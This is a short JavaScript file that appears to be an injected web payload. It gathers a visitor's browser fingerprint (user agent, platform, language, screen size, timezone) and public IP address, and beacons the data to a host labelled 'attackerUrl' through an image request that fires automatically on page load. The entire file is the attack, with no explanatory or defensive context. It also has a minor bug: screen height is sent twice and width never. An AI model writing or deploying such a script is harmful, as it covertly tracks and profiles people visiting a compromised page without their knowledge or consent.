function getUserInfo() {
    var userInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    return userInfo;
}
 
async function sendInfo(){
    try {
        var userInfo = getUserInfo()
        var targetIP = ''
        let response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        targetIP = data.ip;
        var attackerUrl = 'https://192.168.0.10/log.php'
        var img = new Image();
        img.src = attackerUrl + '?data=' + encodeURIComponent(targetIP + ': ' + 
            userInfo.userAgent +', '+
            userInfo.platform +', '+
            userInfo.appName +', '+
            userInfo.appVersion +', '+
            userInfo.language +', '+
            userInfo.screenHeight +', '+
            userInfo.screenHeight +', '+
            userInfo.colorDepth +', '+
            userInfo.timezone +';'
         )
            
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }
}

setTimeout(sendInfo, 1);